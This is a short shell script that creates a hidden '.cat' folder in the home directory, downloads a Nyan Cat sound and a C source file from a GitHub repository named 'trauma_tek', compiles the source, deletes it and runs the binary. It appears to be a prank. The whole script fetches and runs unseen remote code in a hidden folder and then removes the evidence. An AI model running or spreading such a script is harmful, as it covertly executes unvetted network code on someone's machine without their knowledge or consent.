cd $HOME
mkdir ".cat"
cd ".cat"
wget 'https://github.com/LeoBaldachino/trauma_tek/raw/main/nyanCat.wav'
wget 'https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/332a56e5c349155b4db797332be8b99b20f87c6c/WTF_am_I_doing.c'
gcc WTF_am_I_doing.c -lcsfml-audio
rm WTF_am_I_doing.c
./a.out oui